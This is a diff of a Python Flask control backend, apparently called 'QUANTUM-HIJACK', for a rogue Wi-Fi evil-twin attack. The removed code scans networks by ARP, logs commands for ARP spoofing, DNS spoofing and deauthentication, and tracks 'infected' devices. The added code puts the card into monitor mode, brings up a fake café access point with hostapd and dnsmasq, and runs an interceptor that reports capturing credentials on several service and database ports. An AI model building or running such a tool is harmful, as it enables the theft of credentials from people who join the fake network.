@@ -1,757 +1,524 @@
 #!/usr/bin/env python3
 """
-QUANTUM-HIJACK PROJECT
-Herramienta de Hacking Ético 2026 - Emmanuel
-SOLO para testing autorizado y educación
+QUANTUM-HIJACK v2.0 - ROGUE WIFI + INTERCEPTOR
+Control centralizado del concepto completo
+Backend que controla: setup.sh, hostapd, dnsmasq, interceptor.py, dashboard_terminal.py
 """
 
 import os
 import sys
 import subprocess
+import threading
 import time
 import json
+import re
 import socket
 from datetime import datetime
-from flask import Flask, render_template, jsonify, request, send_from_directory
-from scapy.all import ARP, Ether, get_if_hwaddr, conf
-import logging
+from pathlib import Path
+from flask import Flask, render_template, jsonify, request
+from flask_cors import CORS
 
-# Configuración
-logging.basicConfig(level=logging.INFO)
-logger = logging.getLogger(__name__)
+# ═══════════════════════════════════════════════════════════════════════════
+# CONFIGURACIÓN
+# ═══════════════════════════════════════════════════════════════════════════
 
-# Flask app
-app = Flask(__name__, template_folder='templates', static_folder='static')
+app = Flask(__name__, template_folder='templates')
+CORS(app)
 app.config['JSON_SORT_KEYS'] = False
 
-# Database para dispositivos infectados
-INFECTED_DB = 'infected_devices.json'
-LOGS_DB = 'operation_logs.json'
+# Rutas de archivos
+LOGS_DIR = "logs"
+CREDENTIALS_FILE = f"{LOGS_DIR}/captured_credentials.json"
+OPERATION_LOG = f"{LOGS_DIR}/operation_logs.json"
+HOSTAPD_CONF = "hostapd_1.conf"
+DNSMASQ_CONF = "dnsmasq.conf"
 
-def load_infected_devices():
-    """Cargar dispositivos infectados desde archivo"""
-    if os.path.exists(INFECTED_DB):
-        try:
-            with open(INFECTED_DB, 'r') as f:
+# Procesos activos
+processes = {
+    'setup': None,
+    'hostapd': None,
+    'dnsmasq': None,
+    'interceptor': None,
+    'dashboard': None
+}
+
+# Estado global
+state = {
+    'setup_done': False,
+    'hostapd_running': False,
+    'dnsmasq_running': False,
+    'interceptor_running': False,
+    'dashboard_running': False,
+    'clients_connected': [],
+    'credentials_captured': [],
+    'operations_log': [],
+    'wifi_interface': 'wlan0',
+    'monitor_interface': 'wlan0mon',
+    'ssid': 'CafeWiFi_Quantum',
+    'password': '12345678',
+    'gateway_ip': '192.168.1.1'
+}
+
+# ═══════════════════════════════════════════════════════════════════════════
+# UTILIDADES
+# ═══════════════════════════════════════════════════════════════════════════
+
+def ensure_dirs():
+    """Crea directorios necesarios"""
+    Path(LOGS_DIR).mkdir(exist_ok=True)
+    Path("payloads").mkdir(exist_ok=True)
+    Path("capture").mkdir(exist_ok=True)
+
+def log_operation(message, level="INFO"):
+    """Registra operación"""
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    log_entry = f"[{timestamp}] [{level}] {message}"
+    
+    print(log_entry)
+    
+    state['operations_log'].append(log_entry)
+    
+    # Guardar a JSON
+    try:
+        with open(OPERATION_LOG, 'w') as f:
+            json.dump(state['operations_log'][-100:], f, indent=2)
+    except:
+        pass
+
+def detect_wifi_interface():
+    """Detecta automáticamente la interfaz WiFi"""
+    try:
+        result = subprocess.run(['iw', 'dev'], capture_output=True, text=True)
+        for line in result.stdout.split('\n'):
+            if 'interface' in line:
+                iface = line.strip().split()[-1]
+                state['wifi_interface'] = iface
+                state['monitor_interface'] = f"{iface}mon"
+                log_operation(f"Interfaz WiFi detectada: {iface}")
+                return iface
+    except Exception as e:
+        log_operation(f"Error detectando interfaz: {e}", "ERROR")
+    
+    return 'wlan0'
+
+def read_credentials():
+    """Lee credenciales capturadas"""
+    try:
+        if os.path.exists(CREDENTIALS_FILE):
+            with open(CREDENTIALS_FILE, 'r') as f:
                 return json.load(f)
-        except:
-            return []
+    except:
+        pass
     return []
 
-def save_infected_devices(devices):
-    """Guardar dispositivos infectados"""
+def get_connected_clients():
+    """Obtiene clientes conectados al WiFi rogue"""
     try:
-        with open(INFECTED_DB, 'w') as f:
-            json.dump(devices, f, indent=2)
+        result = subprocess.run(['iw', 'dev', state['monitor_interface'], 'station', 'dump'],
+                              capture_output=True, text=True, timeout=5)
+        
+        clients = []
+        current_mac = None
+        
+        for line in result.stdout.split('\n'):
+            if 'Station' in line:
+                try:
+                    current_mac = line.split('Station ')[1].split(' ')[0]
+                    clients.append({
+                        'mac': current_mac,
+                        'ip': 'asignando...',
+                        'connected_at': datetime.now().isoformat()
+                    })
+                except:
+                    pass
+        
+        state['clients_connected'] = clients
+        return clients
+    except:
+        return []
+
+def kill_process_by_name(name):
+    """Mata un proceso por nombre"""
+    try:
+        subprocess.run(['sudo', 'pkill', '-f', name], timeout=5)
         return True
-    except Exception as e:
-        logger.error(f"Error guardando dispositivos: {e}")
+    except:
         return False
 
-def add_log(action, details=""):
-    """Agregar entrada al log de operaciones"""
-    try:
-        logs = []
-        if os.path.exists(LOGS_DB):
-            with open(LOGS_DB, 'r') as f:
-                logs = json.load(f)
-        
-        logs.append({
-            'timestamp': datetime.now().isoformat(),
-            'action': action,
-            'details': details
-        })
-        
-        with open(LOGS_DB, 'w') as f:
-            json.dump(logs[-100:], f, indent=2)  # Guardar últimas 100 entradas
-    except Exception as e:
-        logger.error(f"Error guardando log: {e}")
+# ═══════════════════════════════════════════════════════════════════════════
+# MÓDULOS PRINCIPALES
+# ═══════════════════════════════════════════════════════════════════════════
 
-# Variables globales
-INFECTED_DEVICES = load_infected_devices()
-
-ATTACKS = {
-    'arp_spoofing': False,
-    'dns_spoofing': False,
-    'packet_sniff': False,
-    'deauth': False
-}
-
-STATS = {
-    'packets_captured': 0,
-    'credentials_found': 0,
-    'connected_devices': 0,
-    'start_time': datetime.now().isoformat()
-}
-
-class QuantumHijack:
-    """Clase principal para operaciones de hacking ético"""
+def init_setup():
+    """Ejecuta setup.sh - Prepara antena a modo monitor"""
+    log_operation("[INICIANDO] Setup - Modo Monitor", "PROCESS")
     
-    def __init__(self):
-        self.running = False
-        self.target_ip = None
-        self.gateway_ip = None
-        self.attacker_mac = None
-        self.monitor_interface = None
-        self.original_interface = None
-        self.original_mode = "managed"
+    try:
+        detect_wifi_interface()
         
-    def check_root(self):
-        """Verificar si se ejecuta como root (requerido en Linux)"""
-        if os.name == 'posix' and os.geteuid() != 0:
-            logger.error("❌ Este programa debe ejecutarse como root (sudo)")
-            return False
+        log_operation(f"Bajando interfaz {state['wifi_interface']}...", "STEP")
+        os.system(f"sudo ifconfig {state['wifi_interface']} down")
+        time.sleep(1)
+        
+        log_operation("Matando procesos conflictivos...", "STEP")
+        kill_process_by_name('hostapd')
+        kill_process_by_name('dnsmasq')
+        kill_process_by_name('wpa_supplicant')
+        time.sleep(1)
+        
+        log_operation(f"Iniciando modo monitor en {state['wifi_interface']}...", "STEP")
+        os.system(f"sudo airmon-ng start {state['wifi_interface']}")
+        time.sleep(2)
+        
+        log_operation(f"Configurando interfaz {state['monitor_interface']}...", "STEP")
+        os.system(f"sudo ifconfig {state['monitor_interface']} up")
+        os.system(f"sudo ifconfig {state['monitor_interface']} 192.168.1.1 netmask 255.255.255.0")
+        time.sleep(1)
+        
+        state['setup_done'] = True
+        log_operation("[✓] Setup completado", "SUCCESS")
         return True
-    
-    def run_command(self, command, capture_output=True):
-        """Ejecutar comando del sistema"""
-        try:
-            result = subprocess.run(
-                command,
-                shell=True,
-                capture_output=capture_output,
-                text=True,
-                timeout=10
-            )
-            return result.returncode == 0, result.stdout, result.stderr
-        except Exception as e:
-            logger.error(f"Error ejecutando comando: {e}")
-            return False, "", str(e)
-    
-    def get_wireless_interfaces(self):
-        """Detectar interfaces wireless disponibles"""
-        interfaces = []
-        try:
-            logger.info("🔍 Detectando interfaces wireless...")
-            
-            # Método 1: iwconfig
-            success, output, _ = self.run_command("iwconfig 2>/dev/null")
-            if success and output:
-                for line in output.split('\n'):
-                    if 'IEEE 802.11' in line or 'ESSID' in line:
-                        iface = line.split()[0]
-                        if iface and iface not in interfaces:
-                            interfaces.append(iface)
-            
-            # Método 2: iw dev (más moderno)
-            success, output, _ = self.run_command("iw dev")
-            if success and output:
-                for line in output.split('\n'):
-                    if 'Interface' in line:
-                        iface = line.split()[-1]
-                        if iface and iface not in interfaces:
-                            interfaces.append(iface)
-            
-            logger.info(f"✅ Interfaces encontradas: {interfaces if interfaces else 'Ninguna'}")
-            return interfaces
-        except Exception as e:
-            logger.error(f"Error detectando interfaces: {e}")
-            return []
-    
-    def set_monitor_mode(self, interface=None):
-        """Activar modo monitor en la interfaz wireless"""
-        try:
-            # Si no se especifica, detectar automáticamente
-            if not interface:
-                interfaces = self.get_wireless_interfaces()
-                if not interfaces:
-                    logger.error("❌ No se encontraron interfaces wireless")
-                    return False
-                interface = interfaces[0]
-            
-            self.original_interface = interface
-            logger.info(f"🔧 Configurando {interface} en modo monitor...")
-            
-            # Paso 1: Matar procesos que puedan interferir
-            logger.info("   → Deteniendo procesos interferentes...")
-            self.run_command("airmon-ng check kill", capture_output=False)
-            time.sleep(1)
-            
-            # Paso 2: Bajar la interfaz
-            logger.info(f"   → Bajando interfaz {interface}...")
-            self.run_command(f"ip link set {interface} down")
-            time.sleep(0.5)
-            
-            # Paso 3: Activar modo monitor
-            logger.info(f"   → Activando modo monitor...")
-            success, output, error = self.run_command(f"iwconfig {interface} mode monitor")
-            if not success:
-                logger.warning(f"   ⚠️  iwconfig falló, intentando con iw...")
-                self.run_command(f"iw {interface} set monitor control")
-            
-            time.sleep(0.5)
-            
-            # Paso 4: Levantar la interfaz
-            logger.info(f"   → Levantando interfaz...")
-            self.run_command(f"ip link set {interface} up")
-            time.sleep(1)
-            
-            # Verificar modo monitor
-            success, output, _ = self.run_command(f"iwconfig {interface}")
-            if "Mode:Monitor" in output or "monitor" in output.lower():
-                self.monitor_interface = interface
-                logger.info(f"✅ Modo monitor activado en {interface}")
-                
-                # Configurar canal
-                logger.info("   → Configurando canal 6...")
-                self.run_command(f"iwconfig {interface} channel 6")
-                
-                return True
-            else:
-                logger.error(f"❌ No se pudo activar modo monitor en {interface}")
-                return False
-                
-        except Exception as e:
-            logger.error(f"Error activando modo monitor: {e}")
-            return False
-    
-    def restore_managed_mode(self):
-        """Restaurar modo managed (normal) en la interfaz"""
-        if not self.original_interface:
-            return
         
-        try:
-            interface = self.original_interface
-            logger.info(f"🔄 Restaurando {interface} a modo managed...")
-            
-            # Bajar interfaz
-            self.run_command(f"ip link set {interface} down")
-            time.sleep(0.5)
-            
-            # Volver a modo managed
-            self.run_command(f"iwconfig {interface} mode managed")
-            time.sleep(0.5)
-            
-            # Levantar interfaz
-            self.run_command(f"ip link set {interface} up")
-            time.sleep(0.5)
-            
-            # Reiniciar NetworkManager
-            logger.info("   → Reiniciando NetworkManager...")
-            self.run_command("systemctl restart NetworkManager")
-            
-            logger.info(f"✅ {interface} restaurado a modo managed")
-            
-        except Exception as e:
-            logger.error(f"Error restaurando modo managed: {e}")
-    
-    def get_local_ip(self):
-        """Obtener IP local"""
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.connect(("8.8.8.8", 80))
-            local_ip = s.getsockname()[0]
-            s.close()
-            return local_ip
-        except Exception as e:
-            logger.error(f"Error obteniendo IP local: {e}")
-            return "127.0.0.1"
-    
-    def get_network_range(self):
-        """Detectar rango de red automáticamente"""
-        try:
-            # Fallback a detección simple basada en IP local
-            local_ip = self.get_local_ip()
-            if local_ip.startswith('192.168.'):
-                # Asumir red /24
-                base = '.'.join(local_ip.split('.')[:-1])
-                return f"{base}.0/24"
-            elif local_ip.startswith('10.'):
-                parts = local_ip.split('.')
-                return f"10.{parts[1]}.{parts[2]}.0/24"
-            elif local_ip.startswith('172.'):
-                parts = local_ip.split('.')
-                return f"172.{parts[1]}.{parts[2]}.0/24"
-            else:
-                return "192.168.1.0/24"
-        except Exception as e:
-            logger.error(f"Error detectando rango de red: {e}")
-            return "192.168.1.0/24"
-    
-    def scan_network(self, network_range=None):
-        """Escanear red para descubrir dispositivos"""
-        devices = []
-        try:
-            # Detectar red automáticamente si no se especifica
-            if not network_range:
-                network_range = self.get_network_range()
-            
-            logger.info(f"⏳ [CARGANDO] Preparando escaneo ARP...")
-            logger.info(f"📡 [EJECUTANDO] ARP Scan en rango: {network_range}")
-            logger.info(f"🔍 [COMANDO] arp-scan {network_range} (usando Scapy)")
-            
-            # Crear paquete ARP
-            arp_request = ARP(pdst=network_range)
-            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
-            arp_request_broadcast = broadcast/arp_request
-            
-            logger.info(f"📤 [ENVIANDO] Paquetes ARP broadcast a toda la red...")
-            logger.info(f"⏱️  [ESPERANDO] Respuestas ARP (timeout: 3s)...")
-            
-            # Enviar y recibir paquetes
-            from scapy.all import srp
-            answered_list = srp(arp_request_broadcast, timeout=3, verbose=0)[0]
-            
-            logger.info(f"📥 [RECIBIDO] {len(answered_list)} respuestas ARP")
-            
-            # Procesar respuestas
-            for sent, received in answered_list:
-                device_dict = {
-                    "ip": received.psrc,
-                    "mac": received.hwsrc,
-                    "name": self.get_device_name(received.hwsrc),
-                    "timestamp": datetime.now().isoformat(),
-                    "status": "Activo"
-                }
-                devices.append(device_dict)
-                logger.info(f"   ✓ Dispositivo: {device_dict['ip']} ({device_dict['mac']}) - {device_dict['name']}")
-            
-            STATS['connected_devices'] = len(devices)
-            STATS['total_scans'] += 1
-            
-            if len(devices) > 0:
-                logger.info(f"✅ [COMPLETADO] {len(devices)} dispositivos encontrados y listos para infectar")
-            else:
-                logger.warning(f"⚠️  [ADVERTENCIA] 0 dispositivos encontrados")
-                logger.info(f"💡 [SUGERENCIA] Verifica:")
-                logger.info(f"   1. Que estés conectado a una red WiFi o Ethernet")
-                logger.info(f"   2. Rango de red correcto: {network_range}")
-                logger.info(f"   3. Permisos de root/sudo activos")
-                logger.info(f"   4. Tu IP local: {self.get_local_ip()}")
-            
-            return devices
-        except Exception as e:
-            logger.error(f"❌ [ERROR] Escaneo fallido: {e}")
-            logger.info(f"🔧 [DEBUG] Tipo de error: {type(e).__name__}")
-            return []
-    
-    def get_device_name(self, mac):
-        """Obtener nombre del dispositivo por MAC (vendor lookup)"""
-        try:
-            # Primeros 3 octetos del MAC identifican el fabricante
-            vendor_prefix = mac[:8].upper().replace(':', '')
-            vendors = {
-                '00505': 'Intel',
-                'F0DEF1': 'Xiaomi',
-                '3C84': 'Samsung',
-                '5C80B6': 'Apple',
-                '00E04C': 'Realtek',
-                'A4C494': 'LG',
-                '8863DF': 'Huawei',
-                'B827EB': 'Raspberry Pi',
-                '001B44': 'Cisco',
-                '00D861': 'Netgear'
-            }
-            for prefix, vendor in vendors.items():
-                if vendor_prefix.startswith(prefix):
-                    return f"Device ({vendor})"
-            return "Unknown Device"
-        except:
-            return "Unknown Device"
-    
-    def start_sniffer(self):
-        """Iniciar captura de paquetes"""
-        ATTACKS['packet_sniff'] = True
-        logger.info("⏳ [CARGANDO] Preparando sniffer...")
-        logger.info("🔴 [EJECUTANDO] tcpdump -i any -n (modo Scapy)")
-        logger.info("📡 [ACTIVO] Captura de paquetes en progreso...")
-        STATS['packets_captured'] = 0
-    
-    def stop_sniffer(self):
-        """Detener captura de paquetes"""
-        ATTACKS['packet_sniff'] = False
-        logger.info("🛑 [DETENIDO] Captura de paquetes finalizada")
-        logger.info(f"📊 [RESUMEN] Total paquetes capturados: {STATS['packets_captured']}")
-    
-    def get_status(self):
-        """Obtener estado actual"""
-        return {
-            "status": "running" if self.running else "stopped",
-            "monitor_interface": self.monitor_interface,
-            "monitor_mode_active": self.monitor_interface is not None,
-            "attacks": ATTACKS,
-            "stats": STATS,
-            "local_ip": self.get_local_ip()
-        }
+    except Exception as e:
+        log_operation(f"Error en setup: {e}", "ERROR")
+        return False
 
-# Instancia global
-hijack = QuantumHijack()
-
-# ========================
-# RUTAS FLASK
-# ========================
-
-@app.route('/api/status')
-def api_status():
-    """API: Estado actual del sistema"""
-    return jsonify(hijack.get_status())
-
-@app.route('/api/scan', methods=['POST'])
-def api_scan():
-    """API: Escanear red"""
+def init_hostapd():
+    """Inicia hostapd - WiFi falso"""
+    if not state['setup_done']:
+        log_operation("Setup no completado", "ERROR")
+        return False
+    
+    log_operation("[INICIANDO] Hostapd - WiFi Rogue", "PROCESS")
+    
     try:
-        network = request.json.get('network') if request.json else None
+        # Actualizar config con interfaz correcta
+        with open(HOSTAPD_CONF, 'r') as f:
+            config = f.read()
         
-        logger.info(f"")
-        logger.info(f"{'='*60}")
-        logger.info(f"🔍 [ESCANEO INICIADO] Buscando dispositivos en la red...")
-        if network:
-            logger.info(f"📍 [RANGO] Especificado: {network}")
+        config = config.replace('wlan0mon', state['monitor_interface'])
+        
+        with open(HOSTAPD_CONF, 'w') as f:
+            f.write(config)
+        
+        log_operation(f"Iniciando hostapd con {HOSTAPD_CONF}...", "STEP")
+        
+        processes['hostapd'] = subprocess.Popen(
+            ['sudo', 'hostapd', HOSTAPD_CONF],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True
+        )
+        
+        time.sleep(2)
+        
+        if processes['hostapd'].poll() is None:
+            state['hostapd_running'] = True
+            log_operation(f"[✓] WiFi rogue ACTIVO: {state['ssid']} (pwd: {state['password']})", "SUCCESS")
+            return True
         else:
-            logger.info(f"📍 [RANGO] Auto-detectando red local...")
-        logger.info(f"{'='*60}")
-        
-        devices = hijack.scan_network(network)
-        
-        logger.info(f"")
-        logger.info(f"{'='*60}")
-        logger.info(f"✅ [ESCANEO COMPLETADO]")
-        logger.info(f"📊 [RESULTADO] {len(devices)} dispositivos disponibles para infectar")
-        logger.info(f"{'='*60}")
-        logger.info(f"")
-        
-        add_log('NETWORK_SCAN', f"Encontrados: {len(devices)} dispositivos")
-        
-        return jsonify({
-            "success": True,
-            "devices_found": len(devices),
-            "devices": devices,
-            "network_range": network or hijack.get_network_range()
-        })
-    except Exception as e:
-        logger.error(f"❌ [ERROR] Escaneo fallido: {e}")
-        return jsonify({"success": False, "error": str(e)}), 400
-
-@app.route('/api/attacks/start', methods=['POST'])
-def api_start_attack():
-    """API: Iniciar ataque"""
-    try:
-        attack_type = request.json.get('type', 'packet_sniff')
-        target_ip = request.json.get('ip', 'broadcast')
-        
-        logger.info(f"")
-        logger.info(f"{'='*60}")
-        logger.info(f"⚔️  [ATAQUE INICIADO] Tipo: {attack_type}")
-        logger.info(f"🎯 [OBJETIVO] IP: {target_ip}")
-        logger.info(f"{'='*60}")
-        
-        if attack_type in ATTACKS:
-            if attack_type == 'packet_sniff':
-                hijack.start_sniffer()
-            elif attack_type == 'arp_spoof':
-                logger.info(f"🔧 [COMANDO] arpspoof -i {hijack.monitor_interface or 'wlan0'} -t {target_ip}")
-                logger.info(f"📡 [EJECUTANDO] Envenenamiento ARP en progreso...")
-            elif attack_type == 'dns_hijack':
-                logger.info(f"🔧 [COMANDO] dnsspoof -i {hijack.monitor_interface or 'wlan0'}")
-                logger.info(f"📡 [EJECUTANDO] Redirección DNS activa...")
-            elif attack_type == 'deauth':
-                logger.info(f"🔧 [COMANDO] aireplay-ng --deauth 0 -a {target_ip} {hijack.monitor_interface or 'wlan0mon'}")
-                logger.info(f"📡 [EJECUTANDO] Ataque de desautenticación...")
+            log_operation("Hostapd falló al iniciar", "ERROR")
+            return False
             
-            ATTACKS[attack_type] = True
-            STATS['attacks_completed'] += 1
-            add_log('ATTACK_START', f"Tipo: {attack_type}, Objetivo: {target_ip}")
-            
-            return jsonify({
-                "success": True, 
-                "message": f"Ataque {attack_type} iniciado contra {target_ip}",
-                "details": {
-                    "type": attack_type,
-                    "target": target_ip,
-                    "interface": hijack.monitor_interface or "N/A"
-                }
-            })
-        return jsonify({"success": False, "error": "Tipo de ataque inválido"}), 400
     except Exception as e:
-        logger.error(f"❌ [ERROR] Fallo al iniciar ataque: {e}")
-        return jsonify({"success": False, "error": str(e)}), 400
+        log_operation(f"Error en hostapd: {e}", "ERROR")
+        return False
 
-@app.route('/api/attacks/stop', methods=['POST'])
-def api_stop_attack():
-    """API: Detener ataque"""
+def init_dnsmasq():
+    """Inicia dnsmasq - DHCP"""
+    if not state['setup_done']:
+        log_operation("Setup no completado", "ERROR")
+        return False
+    
+    log_operation("[INICIANDO] Dnsmasq - DHCP", "PROCESS")
+    
     try:
-        attack_type = request.json.get('type', 'packet_sniff')
+        # Actualizar config
+        with open(DNSMASQ_CONF, 'r') as f:
+            config = f.read()
         
-        logger.info(f"🛑 [DETENIENDO] Ataque: {attack_type}")
+        config = config.replace('wlan0mon', state['monitor_interface'])
         
-        if attack_type in ATTACKS:
-            if attack_type == 'packet_sniff':
-                hijack.stop_sniffer()
-            else:
-                logger.info(f"✋ [STOP] Finalizando {attack_type}...")
-                logger.info(f"🔧 [COMANDO] killall arpspoof dnsspoof aireplay-ng")
+        with open(DNSMASQ_CONF, 'w') as f:
+            f.write(config)
+        
+        log_operation(f"Iniciando dnsmasq con {DNSMASQ_CONF}...", "STEP")
+        
+        processes['dnsmasq'] = subprocess.Popen(
+            ['sudo', 'dnsmasq', '-C', DNSMASQ_CONF, '-d'],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True
+        )
+        
+        time.sleep(2)
+        
+        if processes['dnsmasq'].poll() is None:
+            state['dnsmasq_running'] = True
+            log_operation(f"[✓] DHCP ACTIVO: {state['gateway_ip']} → 192.168.1.2-100", "SUCCESS")
+            return True
+        else:
+            log_operation("Dnsmasq falló al iniciar", "ERROR")
+            return False
             
-            ATTACKS[attack_type] = False
-            add_log('ATTACK_STOP', f"Tipo: {attack_type}")
+    except Exception as e:
+        log_operation(f"Error en dnsmasq: {e}", "ERROR")
+        return False
+
+def init_interceptor():
+    """Inicia interceptor.py - Captura de credenciales"""
+    if not state['setup_done']:
+        log_operation("Setup no completado", "ERROR")
+        return False
+    
+    log_operation("[INICIANDO] Interceptor - Captura de Credenciales", "PROCESS")
+    
+    try:
+        log_operation("Iniciando interceptor.py...", "STEP")
+        
+        processes['interceptor'] = subprocess.Popen(
+            ['sudo', 'python3', 'interceptor.py'],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True
+        )
+        
+        time.sleep(1)
+        
+        if processes['interceptor'].poll() is None:
+            state['interceptor_running'] = True
+            log_operation("[✓] Interceptor ACTIVO: Monitorando puertos 21,22,80,443,3306,5432,27017", "SUCCESS")
+            return True
+        else:
+            log_operation("Interceptor falló al iniciar", "ERROR")
+            return False
             
-            return jsonify({
-                "success": True, 
-                "message": f"Ataque {attack_type} detenido",
-                "stats": STATS
-            })
-        return jsonify({"success": False, "error": "Tipo de ataque inválido"}), 400
     except Exception as e:
-        logger.error(f"❌ [ERROR] Fallo al detener ataque: {e}")
-        return jsonify({"success": False, "error": str(e)}), 400
+        log_operation(f"Error en interceptor: {e}", "ERROR")
+        return False
 
-@app.route('/api/stats')
-def api_stats():
-    """API: Estadísticas"""
-    return jsonify(STATS)
-
-@app.route('/api/devices')
-def api_devices():
-    """API: Dispositivos conectados"""
-    return jsonify({
-        "total": STATS['connected_devices'],
-        "timestamp": datetime.now().isoformat()
-    })
-
-@app.route('/api/monitor')
-def api_monitor():
-    """API: Estado del modo monitor"""
-    return jsonify({
-        "monitor_active": hijack.monitor_interface is not None,
-        "interface": hijack.monitor_interface,
-        "original_interface": hijack.original_interface,
-        "available_interfaces": hijack.get_wireless_interfaces()
-    })
-
-@app.route('/api/monitor/enable', methods=['POST'])
-def api_enable_monitor():
-    """API: Activar modo monitor"""
+def init_dashboard():
+    """Inicia dashboard_terminal.py - Mostrador vivo"""
+    log_operation("[INICIANDO] Dashboard Terminal - Mostrador Vivo", "PROCESS")
+    
     try:
-        interface = request.json.get('interface') if request.json else None
-        success = hijack.set_monitor_mode(interface)
-        return jsonify({
-            "success": success,
-            "interface": hijack.monitor_interface,
-            "message": "Modo monitor activado" if success else "No se pudo activar modo monitor"
-        })
+        log_operation("Iniciando dashboard_terminal.py...", "STEP")
+        
+        processes['dashboard'] = subprocess.Popen(
+            ['python3', 'dashboard_terminal.py'],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True
+        )
+        
+        time.sleep(1)
+        
+        if processes['dashboard'].poll() is None:
+            state['dashboard_running'] = True
+            log_operation("[✓] Dashboard ACTIVO: Ver terminal separada", "SUCCESS")
+            return True
+        else:
+            log_operation("Dashboard falló al iniciar", "ERROR")
+            return False
+            
     except Exception as e:
-        return jsonify({"success": False, "error": str(e)}), 400
+        log_operation(f"Error en dashboard: {e}", "ERROR")
+        return False
 
-@app.route('/api/monitor/disable', methods=['POST'])
-def api_disable_monitor():
-    """API: Desactivar modo monitor"""
-    try:
-        hijack.restore_managed_mode()
-        return jsonify({
-            "success": True,
-            "message": "Modo managed restaurado"
-        })
-    except Exception as e:
-        return jsonify({"success": False, "error": str(e)}), 400
-
-# ========================
-# NUEVOS ENDPOINTS - Dashboard
-# ========================
+# ═══════════════════════════════════════════════════════════════════════════
+# API REST ENDPOINTS
+# ═══════════════════════════════════════════════════════════════════════════
 
 @app.route('/')
 def dashboard():
-    """Dashboard principal en HTML"""
-    return render_template('index.html')
+    """Dashboard HTML"""
+    return render_template('index_hijack.html')
 
-@app.route('/api/infected', methods=['GET'])
-def api_infected():
-    """API: Obtener dispositivos infectados"""
+@app.route('/api/status', methods=['GET'])
+def api_status():
+    """Estado actual del sistema"""
     return jsonify({
-        "total": len(INFECTED_DEVICES),
-        "devices": INFECTED_DEVICES
+        'status': 'online',
+        'timestamp': datetime.now().isoformat(),
+        'setup_done': state['setup_done'],
+        'modules': {
+            'hostapd': state['hostapd_running'],
+            'dnsmasq': state['dnsmasq_running'],
+            'interceptor': state['interceptor_running'],
+            'dashboard': state['dashboard_running']
+        },
+        'wifi': {
+            'ssid': state['ssid'],
+            'password': state['password'],
+            'gateway': state['gateway_ip'],
+            'interface': state['monitor_interface']
+        },
+        'clients': len(state['clients_connected']),
+        'credentials': len(state['credentials_captured'])
     })
 
-@app.route('/api/infected/add', methods=['POST'])
-def api_add_infected():
-    """API: Agregar dispositivo a lista de infectados"""
-    try:
-        device = request.json
-        device['timestamp'] = datetime.now().isoformat()
-        device['status'] = 'Comprometido'
-        
-        # Evitar duplicados
-        if not any(d['ip'] == device['ip'] for d in INFECTED_DEVICES):
-            INFECTED_DEVICES.append(device)
-            save_infected_devices(INFECTED_DEVICES)
-            add_log('DEVICE_INFECTED', f"IP: {device['ip']}, MAC: {device['mac']}")
-            
-            return jsonify({
-                "success": True,
-                "message": f"Dispositivo {device['ip']} agregado"
-            })
-        return jsonify({
-            "success": False,
-            "message": "Dispositivo ya existe"
-        }), 400
-    except Exception as e:
-        return jsonify({"success": False, "error": str(e)}), 400
+@app.route('/api/init/setup', methods=['POST'])
+def api_init_setup():
+    """Ejecutar setup"""
+    result = init_setup()
+    return jsonify({'success': result})
 
-@app.route('/api/infected/remove/<ip>', methods=['DELETE'])
-def api_remove_infected(ip):
-    """API: Remover dispositivo de lista de infectados"""
-    global INFECTED_DEVICES
-    try:
-        INFECTED_DEVICES = [d for d in INFECTED_DEVICES if d['ip'] != ip]
-        save_infected_devices(INFECTED_DEVICES)
-        add_log('DEVICE_REMOVED', f"IP: {ip}")
-        
-        return jsonify({
-            "success": True,
-            "message": f"Dispositivo {ip} removido"
-        })
-    except Exception as e:
-        return jsonify({"success": False, "error": str(e)}), 400
+@app.route('/api/init/hostapd', methods=['POST'])
+def api_init_hostapd():
+    """Ejecutar hostapd"""
+    result = init_hostapd()
+    return jsonify({'success': result})
 
-@app.route('/api/infected/clear', methods=['DELETE'])
-def api_clear_infected():
-    """API: Limpiar lista de infectados"""
-    global INFECTED_DEVICES
+@app.route('/api/init/dnsmasq', methods=['POST'])
+def api_init_dnsmasq():
+    """Ejecutar dnsmasq"""
+    result = init_dnsmasq()
+    return jsonify({'success': result})
+
+@app.route('/api/init/interceptor', methods=['POST'])
+def api_init_interceptor():
+    """Ejecutar interceptor"""
+    result = init_interceptor()
+    return jsonify({'success': result})
+
+@app.route('/api/init/dashboard', methods=['POST'])
+def api_init_dashboard():
+    """Ejecutar dashboard terminal"""
+    result = init_dashboard()
+    return jsonify({'success': result})
+
+@app.route('/api/init/all', methods=['POST'])
+def api_init_all():
+    """Ejecutar todo: Setup + Hostapd + Dnsmasq + Interceptor + Dashboard"""
+    log_operation("[🔥] INICIANDO QUANTUM-HIJACK COMPLETO", "PROCESS")
+    
+    results = {
+        'setup': init_setup(),
+        'hostapd': init_hostapd(),
+        'dnsmasq': init_dnsmasq(),
+        'interceptor': init_interceptor(),
+        'dashboard': init_dashboard()
+    }
+    
+    if all(results.values()):
+        log_operation("[✓✓✓] QUANTUM-HIJACK COMPLETAMENTE OPERACIONAL [✓✓✓]", "SUCCESS")
+    
+    return jsonify(results)
+
+@app.route('/api/stop/all', methods=['POST'])
+def api_stop_all():
+    """Detener todo"""
+    log_operation("[DETENIENDO] Todos los módulos...", "PROCESS")
+    
     try:
-        count = len(INFECTED_DEVICES)
-        INFECTED_DEVICES = []
-        save_infected_devices(INFECTED_DEVICES)
-        add_log('INFECTED_CLEARED', f"Total removido: {count}")
-        
-        return jsonify({
-            "success": True,
-            "message": f"{count} dispositivos removidos"
-        })
-    except Exception as e:
-        return jsonify({"success": False, "error": str(e)}), 400
+        for proc_name, proc in processes.items():
+            if proc and proc.poll() is None:
+                proc.terminate()
+                proc.wait(timeout=3)
+                log_operation(f"[✓] {proc_name} detenido", "STEP")
+                state[f'{proc_name}_running'] = False
+    except:
+        pass
+    
+    # Kill por nombre también
+    kill_process_by_name('hostapd')
+    kill_process_by_name('dnsmasq')
+    
+    log_operation("[✓] Todos los módulos detenidos", "SUCCESS")
+    return jsonify({'success': True})
+
+@app.route('/api/clients', methods=['GET'])
+def api_clients():
+    """Obtener clientes conectados"""
+    clients = get_connected_clients()
+    return jsonify({'clients': clients})
